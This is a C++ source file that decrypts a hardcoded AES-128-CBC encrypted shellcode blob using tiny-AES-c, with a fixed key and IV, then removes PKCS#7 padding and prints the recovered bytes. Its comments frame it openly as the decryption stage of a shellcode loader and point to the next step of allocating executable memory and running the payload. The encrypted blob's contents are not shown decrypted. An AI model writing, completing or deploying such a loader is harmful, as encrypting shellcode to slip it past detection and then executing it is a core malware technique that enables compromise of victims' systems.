#include <iostream>
#include <vector>
#include <string>
#include <iomanip>    // For std::hex, std::setfill, std::setw
#include <stdexcept>  // For std::runtime_error
#include <algorithm>  // For std::min
#include <cstring>    // For memcpy
#include <sstream>    // For std::stringstream
#include "Headers/aes.h" // tiny-AES-c header


// --- PKCS#7 Unpadding Function ---
// Function to remove PKCS#7 padding
std::vector<uint8_t> remove_pkcs7_padding(const std::vector<uint8_t>& padded_data) {
    if (padded_data.empty()) {
        return {};
    }

    uint8_t padding_value = padded_data.back();
    if (padding_value == 0 || padding_value > padded_data.size()) {
        // Invalid padding value or padding length exceeds data size
        throw std::runtime_error("Invalid PKCS#7 padding.");
    }

    // Check if all padding bytes have the correct value
    for (size_t i = 0; i < padding_value; ++i) {
        if (padded_data[padded_data.size() - 1 - i] != padding_value) {
            throw std::runtime_error("Invalid PKCS#7 padding (byte mismatch).");
        }
    }

    // Return a new vector without the padding
    return std::vector<uint8_t>(padded_data.begin(), padded_data.end() - padding_value);
}

// Helper to print bytes in hexadecimal
void print_hex(const std::vector<uint8_t>& data, const std::string& label = "") {
    if (!label.empty()) {
        std::cout << label << ": ";
    }
    std::cout << std::hex << std::setfill('0');
    for (uint8_t b : data) {
        std::cout << std::setw(2) << static_cast<int>(b);
    }
    std::cout << std::dec << std::endl; // Reset to decimal for general output
}

int main() {
    // Hardcoded AES key (MUST match the key used for encryption)
    uint8_t key[] = {
        0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0xD2, 0xA6,
        0xAB, 0xF7, 0x15, 0x88, 0x09, 0xCF, 0x4F, 0x3C
    }; // AES128 key (16 bytes)

    // Hardcoded Initialization Vector (IV) (MUST match the IV used for encryption)
    uint8_t iv[] = {
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
    };

    // Replace this with YOUR ENCRYPTED SHELLCODE from the previous run.
    // This is an example placeholder. Make sure it matches the padded length from encryption.
    // Example: If your original shellcode was 65 bytes, and it was padded to 80 bytes for encryption,
    // this encrypted_shellcode_data should be 80 bytes long.
    unsigned char encrypted_shellcode_data[] = {
0x23, 0x7a, 0x1b, 0x95, 0xf9, 0xc5, 0xad, 0x57, 0x4e, 0xb1, 0x92, 0x52, 0x33, 0x1d, 0x0c, 0x2d, 
    0xb3, 0xbf, 0xe9, 0xa8, 0xf8, 0x7b, 0x71, 0xcd, 0x5b, 0xc6, 0xbe, 0xbb, 0xae, 0x6e, 0x79, 0x22, 
    0x07, 0x95, 0xf9, 0x4b, 0x08, 0x2a, 0xd6, 0xc6, 0xaf, 0x44, 0xa8, 0xe0, 0x35, 0x24, 0x67, 0xea, 
    0xbe, 0xe8, 0xed, 0xac, 0x2f, 0x18, 0x2d, 0x19, 0x90, 0x74, 0xbe, 0x19, 0x1e, 0xa0, 0x7e, 0xc4, 
    0xe7, 0xf7, 0x35, 0xc2, 0x92, 0x7a, 0x05, 0x25, 0x4f, 0xa1, 0x2f, 0xe7, 0x54, 0xbc, 0x75, 0x45, 
    0xcb, 0xb8, 0xf5, 0xaf, 0x91, 0xd0, 0x3a, 0xc1, 0x81, 0x41, 0xb3, 0x4a, 0x1c, 0x36, 0x67, 0xc5, 
    0xeb, 0xf2, 0x85, 0x45, 0x20, 0x65, 0x96, 0xc5, 0x2a, 0xec, 0x1f, 0x91, 0xec, 0xfb, 0x7c, 0x04, 
    0x00, 0xe9, 0x7b, 0x20, 0x55, 0x24, 0xd6, 0xe7, 0x20, 0x53, 0x15, 0x86, 0x60, 0x5f, 0x52, 0xda, 
    0x0e, 0xf7, 0xa1, 0x17, 0x55, 0xf7, 0x36, 0x13, 0x42, 0x4b, 0x03, 0x8b, 0x8d, 0xf4, 0x51, 0x01, 
    0x21, 0xc4, 0xa3, 0x7e, 0x5e, 0x50, 0xb6, 0xc1, 0x3c, 0x5d, 0xc3, 0xf0, 0x31, 0x5e, 0xe0, 0xbe, 
    0xfd, 0x19, 0xea, 0x4e, 0xfd, 0xe7, 0x61, 0x6e, 0x6e, 0x2e, 0x1e, 0x9c, 0x9a, 0x19, 0x78, 0x0a, 
    0x0c, 0xc1, 0x38, 0xc7, 0xe7, 0xa0, 0x93, 0x8f, 0x4f, 0xb4, 0x3a, 0x68, 0xc0, 0x50, 0x80, 0x9f, 
    0x29, 0x66, 0xcb, 0x77, 0x48, 0x8b, 0x94, 0xfb, 0x9c, 0x4b, 0x4e, 0xc1, 0xca, 0xf6, 0x6e, 0x7c, 
    0xf8, 0xed, 0xda, 0x08, 0x13, 0x43, 0x2b, 0x0b, 0x08, 0xb6, 0xa5, 0xbe, 0x7f, 0x72, 0x3c, 0x67, 
    0x65, 0x61, 0x62, 0x94, 0x08, 0x7c, 0xe1, 0xee, 0xff, 0x73, 0x3c, 0xa6, 0x52, 0x81, 0x4e, 0xf6, 
    0x7b, 0x9e, 0x67, 0xda, 0x21, 0x0f, 0xea, 0x13, 0x0f, 0x52, 0xc1, 0x54, 0xc6, 0x9b, 0x39, 0x92, 
    0xf9, 0x4f, 0x5e, 0xbc, 0xd6, 0x32, 0xf7, 0xd9, 0x59, 0xbf, 0xb1, 0xfd, 0x3a, 0x0e, 0xd7, 0x72, 
    0xe4, 0x1f, 0xb0, 0x25, 0x0e, 0xc4, 0xe3, 0xab, 0xe8, 0x32, 0xf0, 0x14, 0x09, 0x64, 0x36, 0x08, 
    0x67, 0x0c, 0xa7, 0xd2, 0xce, 0xf7, 0xe0, 0x6e, 0x46, 0x4e, 0x1e, 0xcd, 0xb8, 0xc7, 0x56, 0x28, 
    0x46, 0x10, 0x6b, 0x9a, 0x31, 0x01, 0xa8, 0x05, 0x01, 0x23, 0xd5, 0x74, 0x70, 0x9e, 0x6b, 0xbd, 
    0xe4, 0xa5, 0x0f, 0x83, 0x7b, 0x25, 0xe7, 0x1b, 0xc7, 0xa1, 0x58, 0x4b, 0xea, 0x63, 0x52, 0x4f, 
    0x16, 0x4d, 0x4a, 0xb0, 0xb8, 0x8e, 0x33, 0x88, 0x41, 0xe7, 0x93, 0x40, 0x5f, 0x78, 0x01, 0xa3, 
    0x37, 0x6e, 0x61, 0xcb, 0x66, 0xf1, 0xa9, 0xc0, 0x8f, 0x12, 0xd9, 0x62, 0xbd, 0xba, 0xd6, 0x89, 
    0x01, 0x54, 0x80, 0x4a, 0x17, 0x70, 0x40, 0x1c, 0xc4, 0x11, 0x4c, 0xea, 0xb0, 0x45, 0xdb, 0x50, 
    0xeb, 0x56, 0xf8, 0x6d, 0xef, 0xa4, 0x6d, 0xae, 0x56, 0x9d, 0xe8, 0x27, 0xa1, 0x3e, 0x2d, 0x23, 
    0xd9, 0xe4, 0x3a, 0x78, 0xd5, 0x05, 0xb3, 0xd4, 0xa8, 0x3c, 0xed, 0xf1, 0x22, 0xb3, 0x61, 0xa1, 
    0x8a, 0x9a, 0x05, 0xf9, 0x4e, 0xcb, 0x65, 0xcb, 0x06, 0x95, 0x02, 0x4f, 0xd2, 0xfb, 0xbc, 0xbf, 
    0xec, 0xa2, 0x4d, 0x9e, 0xc8, 0x9f, 0x5f, 0x6c, 0xdb, 0x14, 0x73, 0x23, 0xc9, 0x2c, 0x35, 0x98, 
    0x23, 0x9c, 0x6e, 0x29, 0xe8, 0xc9, 0x45, 0x7c, 0x72, 0x8e, 0x6b, 0x66, 0xe2, 0x3d, 0xe5, 0x89
    };


    // Convert the hardcoded C-style array to std::vector<uint8_t> for easier use
    std::vector<uint8_t> ciphertext_bytes(
        encrypted_shellcode_data,
        encrypted_shellcode_data + sizeof(encrypted_shellcode_data) / sizeof(encrypted_shellcode_data[0])
    );

    std::cout << "Encrypted Shellcode Length: " << ciphertext_bytes.size() << " bytes" << std::endl;
    print_hex(ciphertext_bytes, "Encrypted Shellcode (hex)");

    // Prepare buffer for decrypted bytes
    std::vector<uint8_t> decrypted_bytes(ciphertext_bytes.size());
    std::vector<uint8_t> recovered_shellcode_bytes;

    // Context for AES operation
    struct AES_ctx ctx;

    // --- Decryption ---
    try {
        // Initialize AES context with the key
        AES_init_ctx(&ctx, key);

        // Copy IV to a temporary buffer for decryption
        uint8_t current_iv_decrypt[AES_BLOCKLEN];
        memcpy(current_iv_decrypt, iv, AES_BLOCKLEN);

        // Set the IV for decryption
        AES_ctx_set_iv(&ctx, current_iv_decrypt);

        // Decrypt the ciphertext buffer
        // Note: AES_CBC_decrypt_buffer modifies the input buffer in-place
        std::vector<uint8_t> decrypt_temp_buffer = ciphertext_bytes; // Work on a copy
        AES_CBC_decrypt_buffer(&ctx, decrypt_temp_buffer.data(), decrypt_temp_buffer.size());

        // Copy decrypted data
        std::copy(decrypt_temp_buffer.begin(), decrypt_temp_buffer.end(), decrypted_bytes.begin());

        print_hex(decrypted_bytes, "\nDecrypted (padded) hex");

        // Remove PKCS#7 padding from the decrypted data
        recovered_shellcode_bytes = remove_pkcs7_padding(decrypted_bytes);
        std::cout << "Recovered Shellcode Length (unpadded): " << recovered_shellcode_bytes.size() << " bytes" << std::endl;
        print_hex(recovered_shellcode_bytes, "Recovered Shellcode (hex)");

        // In a real loader, you would now take `recovered_shellcode_bytes`
        // and prepare it for execution (e.g., allocate executable memory, copy bytes, execute).

    } catch (const std::exception& e) {
        std::cerr << "Decryption Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}